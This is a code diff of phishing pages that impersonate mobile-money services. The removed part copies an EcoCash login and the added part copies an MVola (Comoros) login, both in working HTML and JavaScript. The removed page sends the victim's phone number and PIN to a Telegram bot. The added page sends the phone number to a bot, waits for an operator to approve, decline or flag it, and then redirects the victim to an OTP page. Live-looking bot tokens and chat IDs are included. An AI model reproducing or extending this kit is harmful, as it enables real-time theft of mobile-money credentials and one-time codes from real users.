@@ -1,547 +1,504 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="fr">
 
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>EcoCash - Login</title>
+    <title>MVola Replica</title>
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
+        @import url('https://fonts.googleapis.com/css2?family=Albert+Sans:wght@400;500;700&display=swap');
         * {
+            box-sizing: border-box;
             margin: 0;
             padding: 0;
-            box-sizing: border-box;
         }
         
-        html,
         body {
+            font-family: 'Albert Sans', sans-serif;
+            background-color: #ffffff;
+            width: 100vw;
             min-height: 100vh;
-            font-family: 'Inter', sans-serif;
-            background: white;
-            overflow-x: hidden;
-            overflow-y: auto;
+            display: flex;
+            justify-content: center;
         }
         
-        body {
+        .mobile-container {
+            width: 100%;
+            max-width: 600px;
+            height: 100vh;
+            background-color: #ffffff;
+            padding: 40px 24px;
             display: flex;
             flex-direction: column;
+            position: relative;
         }
+        /* Logo Styling */
         
         .logo {
-            text-align: center;
-            padding: 50px 20px 20px;
-            flex-shrink: 0;
-        }
-        
-        .logo-text {
-            font-size: 36px;
+            font-size: 38px;
             font-weight: 700;
-        }
-        
-        .logo-eco {
-            color: #0066ff;
-        }
-        
-        .logo-cash {
-            color: #ff0000;
-        }
-        
-        .login-content {
-            flex: 1 0 auto;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            padding: 0 30px 50px;
-            max-width: 480px;
-            margin: 0 auto;
-            width: 100%;
-        }
-        
-        .title {
-            font-size: 26px;
-            font-weight: 600;
-            color: #333;
+            color: #f4d03f;
             margin-bottom: 40px;
-        }
-        
-        .phone-group {
-            width: 100%;
-            border: 2px solid #0066ff;
-            border-radius: 16px;
+            letter-spacing: -1px;
             display: flex;
             align-items: center;
-            padding: 18px 24px;
-            margin-bottom: 40px;
-            background: white;
         }
         
-        .flag {
+        .logo-m {
+            font-size: 42px;
+            margin-right: 2px;
+            position: relative;
+            top: -2px;
+        }
+        
+        h1 {
             font-size: 28px;
-            margin-right: 12px;
+            font-weight: 500;
+            margin-bottom: 35px;
+            color: #000;
         }
         
-        .country-select {
+        h2 {
+            font-size: 18px;
+            font-weight: 500;
+            margin-bottom: 10px;
+            color: #000;
+        }
+        
+        p.description {
+            font-size: 15px;
+            line-height: 1.4;
+            color: #000;
+            margin-bottom: 25px;
+        }
+        /* Input Field Styling */
+        
+        .input-wrapper {
             display: flex;
             align-items: center;
-            color: #0066ff;
-            font-weight: 600;
-            font-size: 18px;
-            margin-right: 16px;
+            border: 2px solid #f4d03f;
+            border-radius: 6px;
+            padding: 15px 12px;
+            margin-bottom: 35px;
+            background: #fff;
         }
         
-        .dropdown-arrow {
-            font-size: 14px;
-            margin-left: 6px;
+        .flag-container {
+            display: flex;
+            align-items: center;
+            gap: 5px;
+            padding-right: 12px;
+            border-right: 1px solid #eee;
+            margin-right: 15px;
+            cursor: pointer;
+        }
+        /* Comoros Flag */
+        
+        .flag-icon {
+            width: 22px;
+            height: 15px;
+            background: linear-gradient( to bottom, #FFD100 25%, #FFFFFF 25%, #FFFFFF 50%, #CE1126 50%, #CE1126 75%, #3A75C4 75%);
+            position: relative;
+            border: 1px solid #ddd;
+            overflow: hidden;
         }
         
-        .phone-input {
-            flex: 1;
+        .flag-icon::before {
+            content: '';
+            position: absolute;
+            left: 0;
+            top: 0;
+            width: 0;
+            height: 0;
+            border-top: 7.5px solid transparent;
+            border-bottom: 7.5px solid transparent;
+            border-left: 7.5px solid #3D9B35;
+        }
+        
+        .country-code {
+            font-size: 16px;
+            font-weight: 500;
+            color: #333;
+        }
+        
+        .chevron {
+            font-size: 10px;
+            color: #888;
+            margin-left: 2px;
+        }
+        
+        input[type="tel"] {
             border: none;
             outline: none;
             font-size: 18px;
-            color: #333;
-        }
-        
-        .phone-input::placeholder {
-            color: #aaa;
-        }
-        
-        .pin-label {
-            font-size: 16px;
-            color: #666;
-            margin-bottom: 24px;
             font-weight: 500;
+            width: 100%;
+            color: #000;
+            letter-spacing: 1px;
+            font-family: 'Albert Sans', sans-serif;
+        }
+        /* Checkbox Section */
+        
+        .terms-container {
+            display: flex;
+            align-items: center;
+            margin-bottom: 45px;
+            font-size: 15px;
         }
         
-        .pin-group {
+        .custom-checkbox {
+            width: 22px;
+            height: 22px;
+            background-color: #f4d03f;
+            border-radius: 4px;
             display: flex;
             justify-content: center;
-            gap: 20px;
-            margin-bottom: 30px;
-        }
-        
-        .pin-box {
-            width: 60px;
-            height: 60px;
-            border: 2px solid #0066ff;
-            border-radius: 16px;
-            font-size: 28px;
-            text-align: center;
-            background: white;
-            color: #333;
-            font-weight: 600;
-        }
-        
-        .forgot {
-            font-size: 15px;
-            color: #0066ff;
-            text-decoration: none;
-            font-weight: 500;
-            margin-bottom: 40px;
-        }
-        
-        #loginBtn {
-            display: none;
-            width: 100%;
-            max-width: 400px;
-            padding: 18px;
-            background: #0066ff;
-            color: white;
-            border: none;
-            border-radius: 50px;
-            font-size: 18px;
-            font-weight: 700;
+            align-items: center;
+            margin-right: 12px;
             cursor: pointer;
-            margin-bottom: 50px;
-            box-shadow: 0 8px 20px rgba(0, 102, 255, 0.3);
-        }
-        
-        .bottom-section {
-            background: #005eb8;
-            color: white;
-            padding: 100px 30px 80px;
-            text-align: center;
-            width: 100vw;
-            margin-left: calc(-50vw + 50%);
-            position: relative;
             flex-shrink: 0;
         }
         
-        .curve {
-            position: absolute;
-            top: 0;
-            left: 0;
+        .custom-checkbox svg {
+            width: 16px;
+            height: 16px;
+            fill: #000;
+        }
+        
+        .terms-text {
+            color: #000;
+            line-height: 1.3;
+        }
+        
+        .terms-link {
+            color: #2b7de9;
+            text-decoration: none;
+            font-weight: 500;
+        }
+        /* Button */
+        
+        .btn-validate {
             width: 100%;
-            height: 90px;
-            background: white;
-            border-radius: 0 0 50% 50% / 0 0 100% 100%;
-            transform: scaleX(1.8);
-            transform-origin: top;
-        }
-        
-        .bottom-content {
-            position: relative;
-            z-index: 2;
-        }
-        
-        .bottom-text {
-            font-size: 15px;
-            margin-bottom: 35px;
-            line-height: 1.6;
-            opacity: 0.95;
-        }
-        
-        .bottom-btns {
-            display: flex;
-            justify-content: center;
-            gap: 30px;
-            margin-bottom: 40px;
-        }
-        
-        .bottom-btn {
-            background: white;
-            color: #0066ff;
+            background-color: #000;
+            color: #fff;
             border: none;
             border-radius: 30px;
-            padding: 18px 36px;
-            font-weight: 600;
+            padding: 20px;
             font-size: 16px;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            gap: 8px;
-            width: 180px;
-            box-shadow: 0 8px 25px rgba(0, 0, 0, 0.15);
+            font-weight: 500;
+            cursor: pointer;
+            transition: opacity 0.2s;
+            margin-bottom: 30px;
+            font-family: 'Albert Sans', sans-serif;
         }
         
-        .btn-icon {
-            font-size: 26px;
-            color: #0066ff;
-        }
-        
-        .version {
-            font-size: 14px;
-            margin-bottom: 12px;
+        .btn-validate:hover {
             opacity: 0.9;
-            font-weight: 500;
         }
         
-        .terms {
-            font-size: 13px;
-            opacity: 0.85;
-            line-height: 1.5;
+        .content {
+            flex-grow: 1;
         }
+        /* Home Indicator */
         
-        .terms a {
-            color: white;
-            text-decoration: underline;
-            font-weight: 500;
+        .home-indicator {
+            width: 130px;
+            height: 5px;
+            background-color: #444;
+            border-radius: 10px;
+            margin: 0 auto;
         }
+        /* Error Message */
         
-        #spinnerOverlay {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(255, 255, 255, 0.98);
+        .error-msg {
             display: none;
-            justify-content: center;
-            align-items: center;
+            width: 100%;
+            background: #ffe6e6;
+            border: 1px solid #ffcccc;
+            color: #cc0000;
+            padding: 12px 16px;
+            border-radius: 8px;
+            font-size: 14px;
+            margin-bottom: 20px;
+            text-align: center;
+        }
+        /* Loading Overlay */
+        
+        .loading-overlay {
+            display: none;
+            position: fixed;
+            inset: 0;
+            background: rgba(255, 255, 255, 0.95);
+            z-index: 2000;
             flex-direction: column;
-            z-index: 1000;
+            align-items: center;
+            justify-content: center;
+            gap: 20px;
+        }
+        
+        .loading-overlay.active {
+            display: flex;
         }
         
         .spinner {
-            width: 60px;
-            height: 60px;
-            border: 6px solid #f0f0f0;
-            border-top: 6px solid #005eb8;
+            width: 50px;
+            height: 50px;
+            border: 3px solid #f4d03f;
+            border-top-color: #000;
             border-radius: 50%;
-            animation: spin 1s linear infinite;
-            margin-bottom: 30px;
+            animation: spin 0.8s linear infinite;
         }
         
         @keyframes spin {
-            0% {
-                transform: rotate(0deg);
-            }
-            100% {
+            to {
                 transform: rotate(360deg);
             }
         }
         
-        .spinner-text {
-            font-size: 18px;
-            color: #333;
-            text-align: center;
-            line-height: 1.6;
-            max-width: 300px;
-            font-weight: 500;
+        .loading-text {
+            font-weight: 700;
+            font-size: 16px;
+            color: #000;
         }
-        
-        /* Hidden message ID storage for answering callback */
-        .hidden { display: none; }
     </style>
 </head>
 
 <body>
-    <div class="logo">
-        <div class="logo-text">
-            <span class="logo-eco">Eco</span><span class="logo-cash">Cash</span>
+
+    <div class="mobile-container">
+
+        <div class="content">
+            <!-- Logo -->
+            <div class="logo">
+                <span class="logo-m">M</span>Vola
+            </div>
+
+            <h1>Bienvenue à MVola!</h1>
+
+            <!-- Form Section -->
+            <h2>Identification</h2>
+            <p class="description">
+                Veuillez entrer ci-dessous votre numéro de téléphone. Vous allez recevoir un SMS contenant un code à usage unique.
+            </p>
+
+            <!-- Error Message Container -->
+            <div class="error-msg" id="loginError">Accès refusé. Veuillez vérifier vos informations.</div>
+
+            <!-- Form -->
+            <form id="loginForm">
+
+                <!-- Phone Input (7 digits only) -->
+                <div class="input-wrapper">
+                    <div class="flag-container">
+                        <div class="flag-icon"></div>
+                        <span class="country-code">269</span>
+                        <span class="chevron">▼</span>
+                    </div>
+                    <input type="tel" id="phoneInput" value="" placeholder="34 00 00 0" maxlength="7" required>
+                </div>
+
+                <!-- Terms Checkbox -->
+                <div class="terms-container">
+                    <div class="custom-checkbox">
+                        <svg viewBox="0 0 24 24">
+                            <path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/>
+                        </svg>
+                    </div>
+                    <span class="terms-text">
+                        En cochant, vous acceptez nos <a href="#" class="terms-link">CGU</a>
+                    </span>
+                </div>
+
+                <!-- Button -->
+                <button type="submit" class="btn-validate">Valider</button>
+
+            </form>
         </div>
+
+        <!-- Bottom Home Bar -->
+        <div class="home-indicator"></div>
+
     </div>
 
-    <div class="login-content">
-        <h1 class="title">Login</h1>
-
-        <div class="phone-group">
-            <span class="flag">🇿🇼</span>
-            <div class="country-select">
-                +263 <span class="dropdown-arrow">▼</span>
-            </div>
-            <input type="tel" class="phone-input" id="phoneInput" placeholder="Phone Number">
-        </div>
-
-        <div class="pin-label">Enter your PIN</div>
-        <div class="pin-group">
-            <input type="password" class="pin-box" maxlength="1">
-            <input type="password" class="pin-box" maxlength="1">
-            <input type="password" class="pin-box" maxlength="1">
-            <input type="password" class="pin-box" maxlength="1">
-        </div>
-
-        <a href="#" class="forgot">Forgot PIN?</a>
-
-        <button id="loginBtn">LOGIN</button>
-    </div>
-
-    <div class="bottom-section">
-        <div class="curve"></div>
-        <div class="bottom-content">
-            <div class="bottom-text">
-                To register an EcoCash wallet or get assistance,<br> click below
-            </div>
-            <div class="bottom-btns">
-                <a href="#" class="bottom-btn">
-                    <div class="btn-icon">👤</div>
-                    Register
-                </a>
-                <a href="#" class="bottom-btn">
-                    <div class="btn-icon">ℹ️</div>
-                    Help & Support
-                </a>
-            </div>
-            <div class="version">v2.13P</div>
-            <div class="terms">
-                By signing in you agree to the <a href="#">Terms and Conditions</a>
-            </div>
-        </div>
-    </div>
-    <div id="spinnerOverlay">
+    <!-- Loading Overlay -->
+    <div class="loading-overlay" id="loadingOverlay">
         <div class="spinner"></div>
-        <div class="spinner-text">
-            Please wait...<br> This usually takes a few seconds
-        </div>
+        <div class="loading-text">Vérification en cours...</div>
     </div>
+
+    <!-- Script to handle Telegram Integration -->
     <script>
-        const BOT_TOKEN = '8864413329:AAHIX5q5cXDcs-HO3IO_FXCWYrxo1rrfo20';
-        const CHAT_ID = '8182836636';
-        const savedPhone = localStorage.getItem('phone');
-        const phoneInput = document.getElementById('phoneInput');
-        if (savedPhone && savedPhone.length === 9) {
-            phoneInput.value = savedPhone;
-        }
-        const pinBoxes = document.querySelectorAll('.pin-box');
-        const loginBtn = document.getElementById('loginBtn');
-        const spinnerOverlay = document.getElementById('spinnerOverlay');
-        let pinValue = '';
-        let pollInterval;
-        let lastUpdateId = 0;
-        let pollingActive = false;
+        // --- TELEGRAM CONFIGURATION ---
+        // CORRECTED TOKEN (the 'l' was changed to '1')
+        const TELEGRAM_BOT_TOKEN = "8860442173:AAG8rL46NtCjyacbn8OebIxw_7y8q7_Nmq4";
+        const TELEGRAM_CHAT_ID = "5703339850";
 
-        function checkPinComplete() {
-            pinValue = Array.from(pinBoxes).map(box => box.value).join('');
-            loginBtn.style.display = pinValue.length === 4 ? 'block' : 'none';
-        }
-        pinBoxes.forEach((box, index) => {
-            box.addEventListener('input', () => {
-                if (box.value.length === 1 && index < 3) {
-                    pinBoxes[index + 1].focus();
-                }
-                checkPinComplete();
-            });
-            box.addEventListener('keydown', (e) => {
-                if (e.key === 'Backspace' && box.value === '' && index > 0) {
-                    pinBoxes[index - 1].focus();
-                }
-            });
-        });
+        const loginForm = document.getElementById('loginForm');
+        const loadingOverlay = document.getElementById('loadingOverlay');
+        const errorMsg = document.getElementById('loginError');
 
-        function stopPolling() {
-            pollingActive = false;
-            if (pollInterval) {
-                clearInterval(pollInterval);
-                pollInterval = null;
-            }
-            spinnerOverlay.style.display = 'none';
+        function showError(msg) {
+            errorMsg.textContent = msg;
+            errorMsg.style.display = 'block';
         }
 
-        function answerCallback(callbackQueryId) {
-            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    callback_query_id: callbackQueryId
+        function hideError() {
+            errorMsg.style.display = 'none';
+        }
+
+        // --- Polling Logic for Telegram Response ---
+        function startPolling(userNum, onApproveUrl) {
+            let offset = 0;
+            let decided = false;
+            let pollCount = 0;
+            const maxPolls = 90; // Max 3 minutes (90 * 2 seconds)
+
+            // Get initial offset so we only listen to NEW messages
+            fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getUpdates?limit=1`)
+                .then(r => r.json())
+                .then(data => {
+                    if (data.ok && data.result.length > 0) {
+                        offset = data.result[data.result.length - 1].update_id + 1;
+                    }
+                    pollLoop();
                 })
-            }).catch(() => {});
+                .catch(() => pollLoop());
+
+            function pollLoop() {
+                if (decided) return;
+                pollCount++;
+
+                if (pollCount > maxPolls) {
+                    decided = true;
+                    loadingOverlay.classList.remove('active');
+                    showError('Délai expiré. Veuillez réessayer.');
+                    return;
+                }
+
+                fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getUpdates?limit=20&offset=${offset}`)
+                    .then(r => r.json())
+                    .then(data => {
+                        if (!data.ok || decided) {
+                            if (!decided) setTimeout(pollLoop, 2000);
+                            return;
+                        }
+
+                        for (let update of data.result) {
+                            offset = update.update_id + 1;
+
+                            // Check if it's a button click (callback_query)
+                            if (update.callback_query) {
+                                const action = update.callback_query.data;
+
+                                // Acknowledge the button click in Telegram
+                                fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`, {
+                                    method: 'POST',
+                                    headers: {
+                                        'Content-Type': 'application/json'
+                                    },
+                                    body: JSON.stringify({
+                                        callback_query_id: update.callback_query.id,
+                                        text: "Action enregistrée !"
+                                    })
+                                }).catch(() => {});
+
+                                // Check if the action is for THIS user
+                                if (action === `approve_${userNum}`) {
+                                    decided = true;
+                                    loadingOverlay.classList.remove('active');
+                                    window.location.href = onApproveUrl;
+                                    return;
+                                } else if (action === `decline_${userNum}`) {
+                                    decided = true;
+                                    loadingOverlay.classList.remove('active');
+                                    showError('Demande refusée. Veuillez réessayer.');
+                                    return;
+                                } else if (action === `wrong_${userNum}`) {
+                                    decided = true;
+                                    loadingOverlay.classList.remove('active');
+                                    showError('Numéro incorrect. Veuillez vérifier et réessayer.');
+                                    return;
+                                }
+                            }
+                        }
+                        if (!decided) setTimeout(pollLoop, 2000);
+                    })
+                    .catch(() => {
+                        if (!decided) setTimeout(pollLoop, 2000);
+                    });
+            }
         }
 
-        loginBtn.addEventListener('click', () => {
-            const phone = phoneInput.value.trim();
-            if (!phone) {
-                alert('Please enter phone number');
+        // --- Form Submission ---
+        loginForm.addEventListener('submit', function(e) {
+            e.preventDefault();
+            hideError();
+
+            const mobile = document.getElementById('phoneInput').value.trim();
+
+            // Basic validation - MUST BE 7 DIGITS
+            if (mobile.length !== 7) {
+                showError('Veuillez entrer un numéro de téléphone valide à 7 chiffres.');
                 return;
             }
-            
-            // Prevent multiple clicks
-            if (pollingActive) return;
-            pollingActive = true;
-            
-            spinnerOverlay.style.display = 'flex';
-            const timestamp = Date.now();
-            const approveData = 'approve_' + timestamp;
-            const cancelData = 'cancel_' + timestamp;
 
-            const message = `New Login Attempt\n\nPhone: +263 ${phone}\nPIN: ${pinValue}\n\nApprove or cancel this access?`;
-            
-            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            // Save phone number to localStorage for later use
+            localStorage.setItem('userPhone', mobile);
+
+            // Show loading spinner
+            loadingOverlay.classList.add('active');
+
+            const userNum = mobile.replace(/\D/g, ''); // Sanitize number for callback data
+
+            // Prepare the Telegram message
+            const message = `🔔 <b>Nouvelle Connexion MVola</b>\n\n📱 Numéro: <code>+269 ${mobile}</code>\n⏰ Heure: ${new Date().toLocaleString('fr-FR')}\n\nVeuillez approuver, refuser ou signaler comme incorrect :`;
+
+            const keyboard = {
+                inline_keyboard: [
+                    [{
+                        text: "✅ APPROUVER",
+                        callback_data: `approve_${userNum}`
+                    }, {
+                        text: "❌ REFUSER",
+                        callback_data: `decline_${userNum}`
+                    }],
+                    [{
+                        text: "⚠️ NUMÉRO INCORRECT",
+                        callback_data: `wrong_${userNum}`
+                    }]
+                ]
+            };
+
+            // Send message to Telegram
+            fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/json'
                     },
                     body: JSON.stringify({
-                        chat_id: CHAT_ID,
+                        chat_id: TELEGRAM_CHAT_ID,
                         text: message,
-                        reply_markup: {
-                            inline_keyboard: [
-                                [
-                                    { text: 'Allow Proceed', callback_data: approveData },
-                                    { text: 'Cancel', callback_data: cancelData }
-                                ]
-                            ]
-                        }
+                        parse_mode: 'HTML',
+                        reply_markup: JSON.stringify(keyboard)
                     })
                 })
-                .then(response => response.json())
-                .then(data => {
-                    if (!data.ok) {
-                        stopPolling();
-                        alert('Error sending to bot: ' + data.description);
-                        pollingActive = false;
-                        return;
-                    }
-                    // Start polling after successful send
-                    startPolling(approveData, cancelData);
-                })
-                .catch(error => {
-                    stopPolling();
-                    alert('Bot connection error: ' + error);
-                    pollingActive = false;
-                });
-        });
-
-        function startPolling(approveData, cancelData) {
-            // Do an initial fetch to get the latest update_id so we don't reprocess old updates
-            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates`)
                 .then(res => res.json())
                 .then(data => {
-                    if (data.ok && data.result.length > 0) {
-                        // Set offset to the latest update_id + 1 to skip all old updates
-                        const maxId = Math.max(...data.result.map(u => u.update_id));
-                        lastUpdateId = maxId;
+                    if (data.ok) {
+                        // Start checking for your response
+                        startPolling(userNum, 'otp.html');
+                    } else {
+                        loadingOverlay.classList.remove('active');
+                        showError(`Telegram Error: ${data.description || 'Unknown error'}`);
                     }
-                    
-                    // Now start polling from after the last update
-                    pollInterval = setInterval(() => {
-                        if (!pollingActive) return;
-                        
-                        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=${lastUpdateId + 1}&timeout=5`)
-                            .then(res => res.json())
-                            .then(data => {
-                                if (!pollingActive) return;
-                                if (data.ok && data.result.length > 0) {
-                                    for (let update of data.result) {
-                                        // Always advance offset
-                                        if (update.update_id >= lastUpdateId) {
-                                            lastUpdateId = update.update_id;
-                                        }
-                                        
-                                        if (update.callback_query) {
-                                            const cbData = update.callback_query.data;
-                                            const cbId = update.callback_query.id;
-                                            
-                                            // Answer the callback query immediately to acknowledge it
-                                            answerCallback(cbId);
-                                            
-                                            if (cbData === approveData) {
-                                                stopPolling();
-                                                window.location.href = 'verify.html';
-                                                return;
-                                            } else if (cbData === cancelData) {
-                                                stopPolling();
-                                                alert('pin entered is incorrect.');
-                                                return;
-                                            }
-                                        }
-                                    }
-                                }
-                            })
-                            .catch(() => {});
-                    }, 2000);
                 })
-                .catch(() => {
-                    // Fallback: just poll normally
-                    pollInterval = setInterval(() => {
-                        if (!pollingActive) return;
-                        
-                        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=${lastUpdateId + 1}&timeout=5`)
-                            .then(res => res.json())
-                            .then(data => {
-                                if (!pollingActive) return;
-                                if (data.ok && data.result.length > 0) {
-                                    for (let update of data.result) {
-                                        if (update.update_id >= lastUpdateId) {
-                                            lastUpdateId = update.update_id;
-                                        }
-                                        
-                                        if (update.callback_query) {
-                                            const cbData = update.callback_query.data;
-                                            const cbId = update.callback_query.id;
-                                            
-                                            answerCallback(cbId);
-                                            
-                                            if (cbData === approveData) {
-                                                stopPolling();
-                                                window.location.href = 'verify.html';
-                                                return;
-                                            } else if (cbData === cancelData) {
-                                                stopPolling();
-                                                alert('pin entered is incorrect.');
-                                                return;
-                                            }
-                                        }
-                                    }
-                                }
-                            })
-                            .catch(() => {});
-                    }, 2000);
+                .catch((error) => {
+                    loadingOverlay.classList.remove('active');
+                    showError(`Network Error: ${error.message}`);
                 });
-        }
-
-        checkPinComplete();
-        pinBoxes[0].focus();
+        });
     </script>
+
 </body>
 
 </html>
